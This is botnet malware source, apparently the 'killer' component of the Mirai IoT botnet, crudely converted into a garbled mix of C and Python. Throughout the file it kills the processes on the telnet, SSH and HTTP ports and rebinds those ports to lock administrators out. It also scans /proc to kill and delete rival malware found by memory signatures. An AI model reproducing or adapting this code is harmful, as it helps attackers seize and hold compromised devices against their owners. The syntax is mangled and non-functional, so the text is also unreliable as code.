import os
_GNU_SOURCE	= #ifdef DEBUG
import sys
#endif
#include <unistd.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
import time

#include "includes.h"
#include "killer.h"
#include "table.h"
#include "util.h"

killer_realpath_len = 0

def killer_init():
    killer_highest_pid = KILLER_MIN_PID; last_pid_scan = time.time()
    scan_counter = 0
    struct sockaddr_in tmp_bind_addr

    # Let parent continue on main thread
    killer_pid = os.fork()
    if killer_pid > 0 or killer_pid == -1:
        return

    tmp_bind_addr.sin_family = AF_INET
    tmp_bind_addr.sin_addr.s_addr = INADDR_ANY

    # Kill telnet service and prevent it from restarting
#ifdef KILLER_REBIND_TELNET
#ifdef DEBUG
    printf("[killer] Trying to kill port 23\n")
#endif
    if killer_kill_by_port(htons(23)):
#ifdef DEBUG
        printf("[killer] Killed tcp/23 (telnet)\n")
#endif
    else:
#ifdef DEBUG
        printf("[killer] Failed to kill port 23\n")
#endif
    tmp_bind_addr.sin_port = htons(23)

    if (tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1:
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in))
        listen(tmp_bind_fd, 1)
#ifdef DEBUG
    printf("[killer] Bound to tcp/23 (telnet)\n")
#endif
#endif

    # Kill SSH service and prevent it from restarting
#ifdef KILLER_REBIND_SSH
    if killer_kill_by_port(htons(22)):
#ifdef DEBUG
        printf("[killer] Killed tcp/22 (SSH)\n")
#endif
    tmp_bind_addr.sin_port = htons(22)

    if (tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1:
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in))
        listen(tmp_bind_fd, 1)
#ifdef DEBUG
    printf("[killer] Bound to tcp/22 (SSH)\n")
#endif
#endif

    # Kill HTTP service and prevent it from restarting
#ifdef KILLER_REBIND_HTTP
    if killer_kill_by_port(htons(80)):
#ifdef DEBUG
        printf("[killer] Killed tcp/80 (http)\n")
#endif
    tmp_bind_addr.sin_port = htons(80)

    if (tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1:
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in))
        listen(tmp_bind_fd, 1)
#ifdef DEBUG
    printf("[killer] Bound to tcp/80 (http)\n")
#endif
#endif

    # In case the binary is getting deleted, we want to get the REAL realpath
    sleep(5)

    killer_realpath = malloc(PATH_MAX)
    killer_realpath[0] = 0
    killer_realpath_len = 0

    if not has_exe_access():
#ifdef DEBUG
        printf("[killer] Machine does not have /proc/$pid/exe\n")
#endif
        return
#ifdef DEBUG
    printf("[killer] Memory scanning processes\n")
#endif

    while True:
        DIR *dir
        struct dirent *file

        table_unlock_val(TABLE_KILLER_PROC)
        if (dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) == NULL:
#ifdef DEBUG
            printf("[killer] Failed to open /proc!\n")
#endif
            break
        table_lock_val(TABLE_KILLER_PROC)

        while (file = readdir(dir)) != NULL:
            # skip all folders that are not PIDs
            if *(file.d_name) < '0' or *(file.d_name) > '9':
                continue

            exe_path[64]; ptr_exe_path = exe_path realpath[PATH_MAX]
            status_path[64]; ptr_status_path = status_path
            pid = int(file.d_name)

            scan_counter += 1
            if pid <= killer_highest_pid:
                if time.time() - last_pid_scan > KILLER_RESTART_SCAN_TIME: # If more than KILLER_RESTART_SCAN_TIME has passed, restart scans from lowest PID for process wrap
                {
#ifdef DEBUG
                    printf("[killer] %d seconds have passed since last scan. Re-scanning all processes!\n" % (KILLER_RESTART_SCAN_TIME))
#endif
                    killer_highest_pid = KILLER_MIN_PID
                else:
                    if pid > KILLER_MIN_PID and scan_counter % 10 == 0:
                        sleep(1) # Sleep so we can wait for another process to spawn

                continue
            if pid > killer_highest_pid:
                killer_highest_pid = pid
            last_pid_scan = time.time()

            table_unlock_val(TABLE_KILLER_PROC)
            table_unlock_val(TABLE_KILLER_EXE)

            # Store /proc/$pid/exe into exe_path
            ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_PROC, NULL))
            ptr_exe_path += util_strcpy(ptr_exe_path, file.d_name)
            ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_EXE, NULL))

            # Store /proc/$pid/status into status_path
            ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_PROC, NULL))
            ptr_status_path += util_strcpy(ptr_status_path, file.d_name)
            ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_STATUS, NULL))

            table_lock_val(TABLE_KILLER_PROC)
            table_lock_val(TABLE_KILLER_EXE)

            # Resolve exe_path (/proc/$pid/exe) -> realpath
            if (rp_len = readlink(exe_path, realpath, sizeof (realpath) - 1)) != -1:
                realpath[rp_len] = 0 # Nullterminate realpath, since readlink doesn't guarantee a null terminated string

                table_unlock_val(TABLE_KILLER_ANIME)
                # If path contains ".anime" kill.
                if util_stristr(realpath, rp_len - 1, table_retrieve_val(TABLE_KILLER_ANIME, NULL)) != -1:
                    os.unlink(realpath)
                    os.kill(pid, 9)
                table_lock_val(TABLE_KILLER_ANIME)

                # Skip this file if its realpath == killer_realpath
                if pid == os.getpid() or pid == os.getppid() or util_strcmp(realpath, killer_realpath):
                    continue

                if (fd = os.open(realpath, os.O_RDONLY)) == -1:
#ifdef DEBUG
                    printf("[killer] Process '%s' has deleted binary!\n" % (realpath))
#endif
                    os.kill(pid, 9)
                os.close(fd)

            if memory_scan_match(exe_path):
#ifdef DEBUG
                printf("[killer] Memory scan match for binary %s\n" % (exe_path))
#endif
                os.kill(pid, 9)

            #
            # if (upx_scan_match(exe_path, status_path))
            # {
#ifdef DEBUG
                # printf("[killer] UPX scan match for binary %s\n", exe_path)
#endif
                # kill(pid, 9)
            # }
           # 

            # Don't let others memory scan!!!
            util_zero(exe_path, sizeof (exe_path))
            util_zero(status_path, sizeof (status_path))

            sleep(1)

        closedir(dir)

#ifdef DEBUG
    printf("[killer] Finished\n")
#endif

def killer_kill():
    os.kill(killer_pid, 9)

BOOL killer_kill_by_port(port_t port)
    DIR *dir, *fd_dir
    struct dirent *entry, *fd_entry;path = (0), exe[PATH_MAX] = {0}, buffer[513] = {0}
    pid = 0; fd = 0;inode = (0)
    ptr_path = path
    ret = 0

#ifdef DEBUG
    printf("[killer] Finding and killing processes holding port %d\n" % (ntohs(port)))
#endif

    util_itoa(ntohs(port), 16, port_str)
    if util_strlen(port_str) == 2:
        port_str[2] = port_str[0]
        port_str[3] = port_str[1]
        port_str[4] = 0

        port_str[0] = '0'
        port_str[1] = '0'

    table_unlock_val(TABLE_KILLER_PROC)
    table_unlock_val(TABLE_KILLER_EXE)
    table_unlock_val(TABLE_KILLER_FD)

    fd = os.open("/proc/net/tcp", os.O_RDONLY)
    if fd == -1:
        return 0

    while util_fdgets(buffer, 512, fd) != NULL:
        i = 0; ii = 0

        while buffer[i] != 0 and buffer[i] != ':':
            i += 1

        if buffer[i] == 0: continue
        i += 2
        ii = i

        while buffer[i] != 0 and buffer[i] != ' ':
            i += 1
        buffer[i++] = 0

        # Compare the entry in /proc/net/tcp to the hex value of the htons port
        if util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1:
            column_index = 0
            BOOL in_column = False
            BOOL listening_state = False

            while column_index < 7 and buffer[++i] != 0:
                if buffer[i] == ' ' or buffer[i] == '\t':
                    in_column = True
                else:
                    if in_column == True:
                        column_index += 1

                    if in_column == True and column_index == 1 and buffer[i + 1] == 'A':
                        listening_state = True

                    in_column = False
            ii = i

            if listening_state == False:
                continue

            while buffer[i] != 0 and buffer[i] != ' ':
                i += 1
            buffer[i++] = 0

            if util_strlen(&(buffer[ii])) > 15:
                continue

            util_strcpy(inode, &(buffer[ii]))
            break
    os.close(fd)

    # If we failed to find it, lock everything and move on
    if util_strlen(inode) == 0:
#ifdef DEBUG
        printf("Failed to find inode for port %d\n" % (ntohs(port)))
#endif
        table_lock_val(TABLE_KILLER_PROC)
        table_lock_val(TABLE_KILLER_EXE)
        table_lock_val(TABLE_KILLER_FD)

        return 0

#ifdef DEBUG
    printf("Found inode \"%s\" for port %d\n" % (inode, ntohs(port)))
#endif

    if (dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) != NULL:
        while (entry = readdir(dir)) != NULL and ret == 0:
            pid = entry.d_name

            # skip all folders that are not PIDs
            if *pid < '0' or *pid > '9':
                continue

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL))
            util_strcpy(ptr_path + util_strlen(ptr_path), pid)
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_EXE, NULL))

            if readlink(path, exe, PATH_MAX) == -1:
                continue

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL))
            util_strcpy(ptr_path + util_strlen(ptr_path), pid)
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL))
            if (fd_dir = opendir(path)) != NULL:
                while (fd_entry = readdir(fd_dir)) != NULL and ret == 0:
                    fd_str = fd_entry.d_name

                    util_zero(exe, PATH_MAX)
                    util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL))
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid)
                    util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL))
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/")
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str)
                    if readlink(path, exe, PATH_MAX) == -1:
                        continue

                    if util_stristr(exe, util_strlen(exe), inode) != -1:
#ifdef DEBUG
                        printf("[killer] Found pid %d for port %d\n" % (util_atoi(pid, 10), ntohs(port)))
#else
                        os.kill(util_atoi(pid, 10), 9)
#endif
                        ret = 1
                closedir(fd_dir)
        closedir(dir)

    sleep(1)

    table_lock_val(TABLE_KILLER_PROC)
    table_lock_val(TABLE_KILLER_EXE)
    table_lock_val(TABLE_KILLER_FD)

    return ret

static BOOL has_exe_access(void)
    path[PATH_MAX]; ptr_path = path tmp[16]

    table_unlock_val(TABLE_KILLER_PROC)
    table_unlock_val(TABLE_KILLER_EXE)

    # Copy /proc/$pid/exe into path
    ptr_path += util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL))
    ptr_path += util_strcpy(ptr_path, util_itoa(os.getpid(), 10, tmp))
    ptr_path += util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_EXE, NULL))

    # Try to open file
    if (fd = os.open(path, os.O_RDONLY)) == -1:
#ifdef DEBUG
        printf("[killer] Failed to open()\n")
#endif
        return False
    os.close(fd)

    table_lock_val(TABLE_KILLER_PROC)
    table_lock_val(TABLE_KILLER_EXE)

    if (k_rp_len = readlink(path, killer_realpath, PATH_MAX - 1)) != -1:
        killer_realpath[k_rp_len] = 0
#ifdef DEBUG
        printf("[killer] Detected we are running out of `%s`\n" % (killer_realpath))
#endif

    util_zero(path, ptr_path - path)

    return True

#
# static BOOL status_upx_check(char *exe_path, char *status_path)
# {
    # int fd, ret
# 
    # if ((fd = open(exe_path, O_RDONLY)) != -1)
    # {
        # close(fd)
        # return FALSE
    # }
# 
    # if ((fd = open(status_path, O_RDONLY)) == -1)
        # return FALSE
# 
    # while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0)
    # {
        # if (mem_exists(rdbuf, ret, m_qbot_report, m_qbot_len) ||
            # mem_exists(rdbuf, ret, m_qbot_http, m_qbot2_len) ||
            # mem_exists(rdbuf, ret, m_qbot_dup, m_qbot3_len) ||
            # mem_exists(rdbuf, ret, m_upx_str, m_upx_len) ||
            # mem_exists(rdbuf, ret, m_zollard, m_zollard_len))
        # {
            # found = TRUE
            # break
        # }
    # }
# 
    # /eyy
# 
    # close(fd)
    # return FALSE
# }
# 

static BOOL memory_scan_match(path)
    BOOL found = False

    if (fd = os.open(path, os.O_RDONLY)) == -1:
        return False

    table_unlock_val(TABLE_MEM_QBOT)
    table_unlock_val(TABLE_MEM_QBOT2)
    table_unlock_val(TABLE_MEM_QBOT3)
    table_unlock_val(TABLE_MEM_UPX)
    table_unlock_val(TABLE_MEM_ZOLLARD)

    m_qbot_report = table_retrieve_val(TABLE_MEM_QBOT, &m_qbot_len)
    m_qbot_http = table_retrieve_val(TABLE_MEM_QBOT2, &m_qbot2_len)
    m_qbot_dup = table_retrieve_val(TABLE_MEM_QBOT3, &m_qbot3_len)
    m_upx_str = table_retrieve_val(TABLE_MEM_UPX, &m_upx_len)
    m_zollard = table_retrieve_val(TABLE_MEM_ZOLLARD, &m_zollard_len)

    while (ret = os.read(fd, rdbuf, sizeof (rdbuf))) > 0:
        if mem_exists(rdbuf, ret, m_qbot_report, m_qbot_len: or \
            mem_exists(rdbuf, ret, m_qbot_http, m_qbot2_len) or \
            mem_exists(rdbuf, ret, m_qbot_dup, m_qbot3_len) or \
            mem_exists(rdbuf, ret, m_upx_str, m_upx_len) or \
            mem_exists(rdbuf, ret, m_zollard, m_zollard_len))
        {
            found = True
            break

    table_lock_val(TABLE_MEM_QBOT)
    table_lock_val(TABLE_MEM_QBOT2)
    table_lock_val(TABLE_MEM_QBOT3)
    table_lock_val(TABLE_MEM_UPX)
    table_lock_val(TABLE_MEM_ZOLLARD)

    os.close(fd)

    return found

static BOOL mem_exists(buf, buf_len, str, str_len)
    matches = 0

    if str_len > buf_len:
        return False

    while buf_len--:
        if *buf++ == str[matches]:
            if ++matches == str_len:
                return True
        else:
            matches = 0

    return False
